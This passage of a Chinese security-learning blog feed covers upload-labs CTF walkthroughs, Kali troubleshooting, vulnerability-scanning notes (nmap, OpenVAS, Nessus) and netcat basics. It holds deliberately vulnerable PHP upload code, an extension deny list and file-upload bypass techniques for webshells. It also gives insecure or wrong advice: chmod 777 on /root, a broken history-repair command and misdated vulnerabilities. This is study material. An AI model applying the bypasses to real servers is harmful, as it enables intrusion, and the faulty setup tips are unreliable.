  var $cls_arr_ext_accepted = array(
      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this-&gt;isUploadedFile();
    
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;setDir( $dir );
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkExtension();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkSize();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this-&gt;cls_file_exists == 1 ){
      
      $ret = $this-&gt;checkFileExists();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this-&gt;move();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this-&gt;cls_rename_file == 1 ){
      $ret = $this-&gt;renameFile();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
  
  }
......
......
...... 
};
</code></pre>
<ul>
<li>因此也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</li>
</ul>
<h1 id="pass-20-post型00截断绕过末尾绕过-空格绕过">Pass-20-POST型00截断绕过+末尾/.绕过+. 空格绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</li>
</ul>
<h1 id="pass-21-数组绕过">Pass-21-数组+/绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = &quot;禁止上传该类型文件!&quot;;
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = &quot;禁止上传该后缀文件!&quot;;
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = &quot;文件上传成功！&quot;;
                $is_upload = true;
            } else {
                $msg = &quot;文件上传失败！&quot;;
            }
        }
    }
}else{
    $msg = &quot;请选择要上传的文件！&quot;;
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI 问题解决]]></title>
        <id>https://kite-007.github.io/kall-wen-ti-jie-jue/</id>
        <link href="https://kite-007.github.io/kall-wen-ti-jie-jue/">
        </link>
        <updated>2021-04-04T11:22:19.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E5%AE%95%E6%9C%BA%E5%AF%BC%E8%87%B4i2c_piix4">1. 宕机导致i2c_piix4</a></li>
<li><a href="#2-%E5%AE%89%E8%A3%85openvas">2. 安装openvas</a>
<ul>
<li><a href="#1-rsync-error-error-in-socket-io-code-10-at-clientserverc137-receiver323">1. rsync error: error in socket IO (code 10) at clientserver.c(137) [Receiver=3.2.3]</a></li>
<li><a href="#2-root%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98">2. /root/权限问题</a></li>
<li><a href="#3-error-redis-server-is-not-running-or-not-listening-on-socket-varrunredis-openvasredis-serversock">3. ERROR: redis-server is not running or not listening on socket: /var/run/redis-openvas/redis-server.sock</a></li>
<li><a href="#4-error-no-users-found-you-need-to-create-at-least-one-user-to-log-in">4. ERROR: No users found. You need to create at least one user to log in.</a></li>
</ul>
</li>
<li><a href="#3-zsh-corrupt-history-file-homexxxzsh_history">3. zsh: corrupt history file /home/XXX/.zsh_history</a></li>
</ul>
(问题解决)</p>
<h1 id="1-宕机导致i2c_piix4">1. 宕机导致i2c_piix4</h1>
<p>报错：</p>
<pre><code>piix4_smbus 0000:00:07.3: SMBus Host controller not enabled
</code></pre>
<br>
1. 重启kali，进入运行级别3，选择第二个，之后选择进入运行级别3
<ul>
<li><img src="https://kite-007.github.io/post-images/1617535739059.png" alt="" loading="lazy"></li>
</ul>
<ol start="2">
<li>这时出现错误：类似于图下
<ul>
<li><img src="https://kite-007.github.io/post-images/1617535894449.png" alt="" loading="lazy"></li>
</ul>
</li>
</ol>
<pre><code>Failure:File system check of the root filesystem failed
</code></pre>
<ol start="3">
<li>输入：</li>
</ol>
<pre><code># 一致按y，yes
fsck [红色方框中的路径]
或
fsck -y [红色方框中的路径]
# 直到看到initramfs命令行
</code></pre>
<ol start="4">
<li>重启kali，进入运行级别3，选择第二个，之后选择进入运行级别3，输入root密码</li>
</ol>
<pre><code>1.查明装入模块的名字：lsmod | grep i2c
# 会回显i2c_piix4 或者其他
</code></pre>
<br>
<pre><code>2.切换目录查看：
cd /etc/modprobe.d/
ls
</code></pre>
<br>
<pre><code>3. 在文件最后一行加：blacklist i2c_piix4
# 主要是libhackrf0.conf
# 但是并不确定具体是哪一个所以我都加了
# 不是root用sudo
vi [****]
按ESC退出编辑模式；
按下shift+：，输入wq!，这里是vim命令，表示强制保存并退出
</code></pre>
<br>
<pre><code>4. 重新生成引导文件：
sudo update-initramfs -u -k all
</code></pre>
<br>
<pre><code>5.重启
</code></pre>
<h1 id="2-安装openvas">2. 安装openvas</h1>
<h2 id="1-rsync-error-error-in-socket-io-code-10-at-clientserverc137-receiver323">1. rsync error: error in socket IO (code 10) at clientserver.c(137) [Receiver=3.2.3]</h2>
<ol>
<li>下载安装redis-server</li>
</ol>
<pre><code>apt search redis
apt install redis-server
</code></pre>
<ol start="2">
<li>安装firewall，开放873端口：</li>
</ol>
<pre><code>apt install firewall
firewall-cmd --permanent --add-port=873/tcp
firewall-cmd --query-port=873/tcp
firewall-cmd --reload
</code></pre>
<h2 id="2-root权限问题">2. /root/权限问题</h2>
<p>给root目录开放777权限</p>
<pre><code># root ：777
# /var/log/gvm：777
chmod 777 [目录]
</code></pre>
<h2 id="3-error-redis-server-is-not-running-or-not-listening-on-socket-varrunredis-openvasredis-serversock">3. ERROR: redis-server is not running or not listening on socket: /var/run/redis-openvas/redis-server.sock</h2>
<p>提示：FIX: You should start the redis-server with 'systemctl start redis-server@openvas.service' or configure it to listen on socket: /var/run/redis-openvas/redis-server.sock</p>
<pre><code>systemctl start redis-server@openvas.service
</code></pre>
<h2 id="4-error-no-users-found-you-need-to-create-at-least-one-user-to-log-in">4. ERROR: No users found. You need to create at least one user to log in.</h2>
<p>提示：FIX: create a user by running 'sudo runuser -u _gvm -- gvmd --create-user=&lt;name&gt; --password=&lt;password&gt;'</p>
<h1 id="3-zsh-corrupt-history-file-homexxxzsh_history">3. zsh: corrupt history file /home/XXX/.zsh_history</h1>
<p>zsh是一个相当好用的shell，相信使用linux系统的朋友都不陌生，当然还有my zsh,不过有的时候会出现一些问题，例如因为有的时候系统因为默写原因强行启动的时候会破坏zsh的历史文件，导致下次使用的时候提示：zsh: corrupt history file /home/xxx/.zsh_history错误。</p>
<p>我们有一种暴力的解决方式，那就是删除，但是这样的话，我们以前的很多的历史命令就会没有，非常的麻烦。</p>
<pre><code>cp .zsh_history zsh_history
rm -f .zsh_history 
strings zsh_history .zsh_history
#OK了，修复成功。
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI 漏洞扫描]]></title>
        <id>https://kite-007.github.io/kali-lou-dong-sao-miao/</id>
        <link href="https://kite-007.github.io/kali-lou-dong-sao-miao/">
        </link>
        <updated>2021-04-01T10:13:06.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E">1. 发现漏洞</a>
<ul>
<li><a href="#1-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E-2">1. 发现漏洞</a></li>
<li><a href="#2-%E4%BB%8E%E4%BF%A1%E6%81%AF%E7%9A%84%E7%BB%B4%E5%BA%A6%E5%AE%9A%E4%B9%89%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86">2. 从信息的维度定义漏洞管理</a></li>
<li><a href="#3-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B">3. 弱点扫描类型</a></li>
<li><a href="#4-%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">4. 漏洞基本概念</a></li>
</ul>
</li>
<li><a href="#2-nmap%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC">2. NMAP常用扫描脚本</a></li>
<li><a href="#3-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E5%99%A8">3. 弱点扫描器</a>
<ul>
<li><a href="#1-openvas">1. OPENVAS</a></li>
<li><a href="#2-nessus">2. NESSUS</a></li>
</ul>
</li>
</ul>
(KALI)</p>
<h1 id="1-发现漏洞">1. 发现漏洞</h1>
<h2 id="1-发现漏洞-2">1. 发现漏洞</h2>
<ol>
<li>基于端口服务扫描结果版本信息（速度比较慢）。</li>
<li>搜索已公开的漏洞数据库（数量大）。</li>
<li>使用弱点扫描器实现漏洞管理，自动利用漏洞代码进行探测，能够快速发现目的信息。</li>
</ol>
<ul>
<li>exploit-db.com网站中存放着大量的关于漏洞以及利用的代码，可以下载漏洞源码，进行尝试。</li>
<li><img src="https://kite-007.github.io/post-images/1617272711283.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>searchsploit 工具，kali下自带的一个漏洞查询工具</li>
<li><img src="https://kite-007.github.io/post-images/1617273103152.png" alt="" loading="lazy">
<ul>
<li>这些内容是存放在操作系统的某个目录下的，目录下会按照平台，脚本以及类型进行划分。</li>
<li>cd /usr/share/exploitdb/exploits目录下面有分类，这是可以按照搜索下面的Path目录进行访问查看。</li>
<li>vim ./multiple/remote/21490.txt</li>
<li><img src="https://kite-007.github.io/post-images/1617273524071.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
<h2 id="2-从信息的维度定义漏洞管理">2. 从信息的维度定义漏洞管理</h2>
<ol>
<li>企业：</li>
</ol>
<ul>
<li>优先从漏洞的危险等级，从高到低进行处理，逐渐改进，不断完善。</li>
<li>信息收集
<ul>
<li>漏洞扫描器扫描发现网络IP，OS，服务，配置，漏洞</li>
<li>能力需求：定义扫描方式内容和目标。</li>
</ul>
</li>
<li>信息管理*
<ul>
<li>格式化信息，并进行筛选，分组，定义优先级</li>
<li>能力需求：资产分组，指定所有者，向所有者报告漏洞</li>
</ul>
</li>
<li>信息输出
<ul>
<li>向不同层次的人群展示足够的信息量，生成不同的报告</li>
<li>能力需求：生成报告，导出数据，SIEM集成进行统一管理</li>
</ul>
</li>
</ul>
<h2 id="3-弱点扫描类型">3. 弱点扫描类型</h2>
<ul>
<li>主动扫描
<ul>
<li>有身份验证</li>
<li>无身份验证</li>
</ul>
</li>
<li>被动扫描
<ul>
<li>镜像端口抓包</li>
<li>其他来源输入</li>
</ul>
</li>
</ul>
<pre><code>主动扫描和被动扫描都是无法进行登录目标系统，以一种接近黑盒的形式对目标系统进行探测，根据
反馈去猜测目标系统是否存在漏洞。主动扫描也可以有目标系统的登录权，可以有扫描器登入到系统
对目标进行扫描，通常情况使用不多。
</code></pre>
<ul>
<li>基于Agent的扫描
<ul>
<li>支持平台有限</li>
</ul>
</li>
</ul>
<pre><code>企业中对漏洞管理会使用的一种场景，需要在所有的服务器上面所有的设备上面，安装扫描器的a，
a工作在目标系统里面，之后会在目标系统里面进行查询，探测，软件补丁版本判断。这样，通常
下扫描的判断比较准确，效率比较高，但是比较受平台的限制，比如一些设备不可以去安装agent，
交换机，应用场景局限。
</code></pre>
<h2 id="4-漏洞基本概念">4. 漏洞基本概念</h2>
<ol>
<li>
<p>CVSS（Common Vulnerability Scoring System）</p>
<ul>
<li>通用漏洞评分系统——工业标准，CVSS是安全内容自动化协议（SCAP）的一部分，通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新。
<ul>
<li>描述安全漏洞严重程度的统一评分方案，作用是给各个漏洞进行评分，按照漏洞的严重级别，给漏洞进行打分，最低0分，最高10分。</li>
</ul>
</li>
<li>不同机构按CVSS分值定义威胁的安全程度，低，中，高。</li>
<li>CVSS分值是工业标准，但威胁级别不是。</li>
<li>路由度量值
<ul>
<li>Basic Metric：基础的恒定不变的弱点权重</li>
<li>Temporal Metric：依赖时间因素的弱点权重</li>
<li>Envriomental Metric：利用弱点的环境要求和实施难度的权重</li>
</ul>
</li>
</ul>
</li>
<li>
<p>CVE（Common Vulnerabilities and Exposures）</p>
<ul>
<li>每发现一个漏洞，管理组织就会给一个编号：CVE-2008-4250
<ul>
<li>是已公开的信息安全漏洞字典，统一的漏洞编号标准</li>
<li>所有的扫描器都会遵守CVE的编号</li>
<li>发布流程：发现漏洞，CAN指定CVE ID，发布到CVE List，MITRE公司负责对内容进行编辑维护。</li>
</ul>
</li>
<li>很多厂商会维护自己的漏洞编号。
<ul>
<li>MS（微软）</li>
<li>MSKB（微软补丁）</li>
</ul>
</li>
</ul>
</li>
<li>
<p>SCAP</p>
</li>
</ol>
<h1 id="2-nmap常用扫描脚本">2. NMAP常用扫描脚本</h1>
<pre><code class="language-shell"># NMAP里包含所有脚本名称的一个文件，总共600+个
cd /usr/share/nmap/scripts
cat script.db

# safe，安全类脚本，不会对目标产生破坏
# discovery，用于发现的脚本
# vuln，用于检测漏洞的脚本
# exploit，漏洞利用
</code></pre>
<p><br><br></p>
<ul>
<li>smb-vuln-ms10-061.nse
<ul>
<li>Stuxnet蠕虫利用的4个漏洞之一，Stuxnet是美国对伊朗核设施进行攻击的震网病毒，美国军方所研发专门用来攻击伊朗核设施的一个病毒。</li>
<li>smb-vuln-ms10-061.nse通过LANMAN API枚举对方系统的共享打印机，如果发现对方的打印机的话，一些低版本的系统(win XP，Server 2003 SP2，Vista，Server 2008，win 7)的Print Spooler权限默认是不当的，通过请求Print Spooler就可以在目标系统的操作目录下去执行恶意代码，去控制目标操作系统。<br>
<br><br></li>
</ul>
</li>
<li>smb-enum-shares.nse
<ul>
<li>如果目标系统没有开放LANMAN API就可以用smb-enum-shares.nse枚举共享去发现对方的打印机。 但是需要提供管理员账号，smbuser，smbpassword。</li>
</ul>
</li>
</ul>
<pre><code class="language-shell">nmap -p445 --script=smb-enum-shares.nse --script-args=smbuser=admin,smbpassword=pass 1.1.1.1

eg：
1. # 扫描查看此网段下的主机
    nmap 192.168.200.0/24 -sn
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617281958281.png" alt="" loading="lazy"></li>
</ul>
<pre><code class="language-shell">2. # 对此网段下的主机进行测试查看，看有没有开放端口
nmap -p445 --script=smb-enum-shares.nse 192.168.200.*
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://kite-007.github.io/post-images/1617282092379.png" alt="" loading="lazy"></figure>
<h1 id="3-弱点扫描器">3. 弱点扫描器</h1>
<h2 id="1-openvas">1. OPENVAS</h2>
<ul>
<li>是开源的扫描器，最早是Nessus的一个项目分支，Nessus是目前世界上使用最广的一个商业的弱点扫描器。有开源版本，kali默认安装，但未配置和启用。</li>
</ul>
<ol>
<li>配置OPENVAS(早期)
<ol>
<li>安装</li>
<li>创建证书</li>
<li>同步弱点数据库</li>
<li>创建客户端证书</li>
<li>重建数据库</li>
<li>备份数据库</li>
<li>启动服务装入插件</li>
<li>创建管理员账号</li>
<li>配置服务监听端口</li>
<li>安装验证</li>
</ol>
</li>
<li>目前配置(kali)</li>
</ol>
<pre><code># 初始化安装
sudo gvm-setup

# 检查安装结果
gvm-check-setup

# 查看当前帐号
openvasmd --list-users

# 修改账号密码
openvasmd --user=admin --new-password=Password

# 升级
openvas-feed-update
</code></pre>
<p><br><br><br><br>
3. openvas体系<br>
1. openvas manager，核心组件，负责把其他不同的组件统一进行一个连接，所发出的每一个指令都是通过manager进行下发并调度执行的。<br>
2. openvas scanner，扫描器，可以管理多个scanner，扫描目标系统，当扫描的任务巨大时，它可以进行多级部署，形成一个集群式的部署方式，也可以在多台服务器上面安装scanner，通过一个manager进行调用scanner扫描不同的目标系统。<br>
3. osp scanner，osp scanner里包含了多个扫描器，是一个扫描器组，统一交给manager，进行统一管理，每一次扫描对目标系统的扫描配置都是一致的。<br>
4. Greenbone Security Assistant，绿骨头安全助理，给用户提供一个能够访问openvas manager的一个外部接口，相当于一个Web的服务器端，通过服务器端可以在客户端上面使用Web浏览器上面去访问Web接口去访问这个网站，可以通过这个网站去page去管理manager里面的内容，由manager去制定策略，去指定扫描目标，由scanner对目标进行扫描。<br>
5. gmp clients，可以使用命令行，通过api去调用管理manager。<br>
6. 通过feed更新的NVTs，SCAPCERT信息会同步到scanner，manager。<br>
7. UserData，用户数据会存在本地的数据库里面，通过manager管理。<br>
8. <img src="https://kite-007.github.io/post-images/1617285259599.png" alt="" loading="lazy"></p>
<h2 id="2-nessus">2. NESSUS</h2>
<p>下载链接：<a href="http://www.tenable.com/products/nessus/select-your-operating-system">http://www.tenable.com/products/nessus/select-your-operating-system</a></p>
<p>安装后进入下载的目录：</p>
<pre><code># 安装路径：/opt/nessus
dpkg -i [安装的压缩文件名]

# 启动服务：
/etc/init.d/nessusd start
/opt/nessus/bin ./nessusd
service nessusd start

# 查看服务信息
/etc/init.d/nessusd status
/opt/nessus/bin ./nessus-service
service nessusd status

# 管理地址
• https://127.0.0.1:8834

# 注册激活码，这个是一次性码如果你卸载，然后重新安装，你需要再次注册扫描仪，并收到另一个激活码。
• http://www.tenable.com/products/nessus-home
</code></pre>
<p><strong>以扫描主机为主</strong><br>
    与openvas大体上相同，如果需要去做一个扫描，openvas：（page文件——》目标——》text），nessus：（策略policy——》扫描scan），nessus里面默认集成了许多扫描模板，以下是2015年免费使用的模板，当然现在的模板比当时的要多好多了，这里以Advanced Scan为主。<br>
<br><br><br><br>
功能模块：</p>
<ul>
<li>
<ol>
<li>Advanced Scan(高级扫描)<br>
最经常使用的扫描。</li>
</ol>
</li>
<li>
<ol start="2">
<li>Basic Network Scan(基础网络扫描)<br>
完全的操作系统扫描，对任何主机进行一个全系统扫描。</li>
</ol>
</li>
<li>
<ol start="3">
<li>Bash Shellshock Detection(检测破壳漏洞扫描)2014</li>
</ol>
</li>
<li>
<ol start="4">
<li>Credentialed Patch Audit(身份验证信息审计)</li>
</ol>
</li>
<li>
<ol start="5">
<li>Spectre and Meltdown(幽灵病毒)2015<br>
有的版本叫做（GHOST(glibc) Detection）基于C语言最底层glibc模块的一个漏洞。</li>
</ol>
</li>
<li>
<ol start="6">
<li>Host Discovery(主机发现模板)</li>
</ol>
</li>
<li>
<ol start="7">
<li>Web Application Tests(Web应用扫描测试)<br>
通常不会使用这个模块，最新版有这个功能，但是能扫的漏洞非常少，如果需要扫描Web应用，最好使用专业的Web应用扫描器。<br>
<br><br><br></li>
</ol>
</li>
</ul>
<p>一下为Advanced Scan模块操作：</p>
<ol>
<li>进入主界面，选择policy制作策略，新增策略：</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617523402954.png" alt="" loading="lazy"></li>
</ul>
<ol start="2">
<li>nessus先创建策略，在进行Scan，这里直接选择Scan：</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617524121489.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524166643.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524179982.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524188632.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524196330.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524205328.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524232816.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524240163.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524251147.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524261430.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524275439.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524285292.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524293542.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524318178.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524327177.png" alt="" loading="lazy"></li>
</ul>
<ol start="3">
<li>开启扫描，等待完成：</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617524601436.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524848493.png" alt="" loading="lazy"></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI 基本工具]]></title>
        <id>https://kite-007.github.io/kali-ji-ben-gong-ju/</id>
        <link href="https://kite-007.github.io/kali-ji-ben-gong-ju/">
        </link>
        <updated>2021-04-01T08:50:01.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#netcat-nc">NETCAT-NC</a>
<ul>
<li><a href="#0-%E4%BB%8B%E7%BB%8D">0. 介绍</a></li>
<li><a href="#1-telnet">1. telnet</a></li>
<li><a href="#2-%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF">2. 传输文本信息</a></li>
<li><a href="#3-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95">3. 传输文件，目录</a></li>
<li><a href="#4-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6">4. 加密传输文件</a></li>
<li><a href="#5-%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8">5. 流媒体服务器</a></li>
<li><a href="#6-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">6. 端口扫描</a></li>
<li><a href="#7-%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98%E5%86%85%E5%AD%98">7. 远程克隆硬盘，内存</a></li>
<li><a href="#8-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6">8. 远程控制</a></li>
<li><a href="#9-%E5%8A%A0%E5%AF%86%E6%89%80%E6%9C%89%E6%B5%81%E9%87%8F">9. 加密所有流量</a></li>
</ul>
</li>
<li><a href="#wireshark">WIRESHARK</a>
<ul>
<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
<li><a href="#%E5%90%AF%E5%8A%A8%E8%AF%95%E7%9D%80%E6%8A%93%E5%8F%96">启动试着抓取</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1">信息统计</a></li>
<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a></li>
</ul>
</li>
</ul>
(基本工具)</p>
<h1 id="netcat-nc">NETCAT-NC</h1>
<h2 id="0-介绍">0. 介绍</h2>
<p>        在网络中的外号是瑞士军刀，身材小巧，能力非凡。</p>
<ul>
<li>充当telnet。我们通常在win下面会使用telnet，去连接别人的端口（23，25等）对其发送一些指令，或者获取到一些信息。但是有了nc之后就可以舍弃掉telnet了，更加强大，更加稳定，可以完成telnet所有可以完成的工作。</li>
<li>传输文本信息。eg：可以将其当作一种聊天工具。</li>
<li>传输文件目录。作为文件服务器，或者是ftp服务器。</li>
<li>加密传输文件。利用系统的加密特性结合来实现加密的传输文件的功能，默认情况下，nc传输文件是不加密的。</li>
<li>远程控制。某种意义上来说可以作为一种木马来使用，可以远程控制某个服务器，虽然是个命令行工具，但是也可以完全控制目标服务器，而且所有的杀毒软件不会将nc当作病毒查杀，非常理想的远程控制器。</li>
<li>加密所有数据流量。</li>
<li>流媒体服务器。像网络上的视频服务器，都是基于流的一个流媒体，nc也可以作为一个流媒体服务器，当然，流媒体的服务器客户端，nc都可以来做，</li>
<li>远程克隆硬盘。（电子取证）<br>
<br></li>
</ul>
<pre><code># 查看帮助信息，可用参数
nc -h

# 显示详细的连接的相关信息，输出内容
nc -v

# 后面紧跟IP地址，如果后面紧跟域名，则不会进行dns解析，因为一般解析dns比较慢，所以需要提前把域名解析，直接将IP交予nc使用
nc -n

# 指定端口号
nc -p 4444
</code></pre>
<h2 id="1-telnet">1. telnet</h2>
<ul>
<li>NC——TELNET / BANNER
<ul>
<li>能够连接目标端口，发送指令，连接对方服务
<ul>
<li>比如现在有一个邮件服务器，NC能够连接SMTP端口或TOP3端口，以及有一个网站的话，他能够链接该网站的80端口，或者是能够作为客户端使用（连接其他服务器的服务端口，对服务端口发送指令进行探测），也能作为服务端使用。</li>
<li>eg1:(使用nc连接邮件服务器，可以用来接收邮件)
<ul>
<li>ping pop3.163.com ，# 解析得到该域名的相关IP地址，以及对应的端口</li>
<li>nc -vn 123.126.97.79 110 ，# pop3所走的端口是110端口，作为客户端连接服务器的端口的最基本命令
<ul>
<li><img src="https://kite-007.github.io/post-images/1617629786150.png" alt="" loading="lazy"></li>
<li>这里我们看到了nc第一个作用：通过连接到对方服务器能过得到服务器的banner信息，发现：110端口是打开的，同时服务器返回了一个welcome，通过welcome可以得到163所用的邮件服务器用的是coremail，通过coremail来实现他的邮件服务，连接上可以在当前的命令上面做一些命令的输入。</li>
<li><img src="https://kite-007.github.io/post-images/1617630308494.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617630772497.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>试着smtp，端口号是25</li>
<li><img src="https://kite-007.github.io/post-images/1617631049241.png" alt="" loading="lazy"></li>
<li>Anti-spam GT一个反垃圾邮件的GT版本</li>
</ul>
<hr>
</li>
</ul>
</li>
<li>eg2:(使用nc连接Web服务器，请求页面)
<ul>
<li>如果对方有http服务器，可以直接连接对方的80端口，这里打开Metasploitable2，上面有Web服务。</li>
<li><img src="https://kite-007.github.io/post-images/1617675952113.png" alt="" loading="lazy"></li>
<li>通过敲击命令可以将对方的网页信息请求过来。</li>
<li><img src="https://kite-007.github.io/post-images/1617675959776.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>演示：
<ul>
<li>QQ邮箱POP3端口 QQ邮箱接收邮件服务器： pop.qq.com ，使用SSL，端口号995 QQ邮箱POP3的端口号995,SMTP的端口号是465或587。</li>
<li>为了保障用户邮箱的安全，QQ邮箱设置了POP3/SMTP/IMAP的开关。系统缺省设置是“关闭”，在用户需要这些功能时请“开启”才可以用客户端软件收发邮件。</li>
<li><img src="https://kite-007.github.io/post-images/1617675002280.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617675007033.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>
</code></pre>
<h2 id="2-传输文本信息">2. 传输文本信息</h2>
<ul>
<li>能够实现传输文本信息的功能，这里以聊天的功能举例。</li>
<li>聊天功能需要用到两个机子，一个做为服务器，一个做为客户机，两个主机进行通信。
<ul>
<li>eg：（聊天功能）
<ul>
<li>首先需要一台服务器开放一个端口，侦听一个端口，之后另外一个做为客户端对端口进行连接，连接之后，两个机子会产生一个TCP连接，之后默认情况下可以进行为本信息的传递。</li>
<li>nc -l -p 4444（服务端）
<ul>
<li>-l，告诉nc要打开侦听一个端口</li>
<li>-p，指定端口号</li>
</ul>
</li>
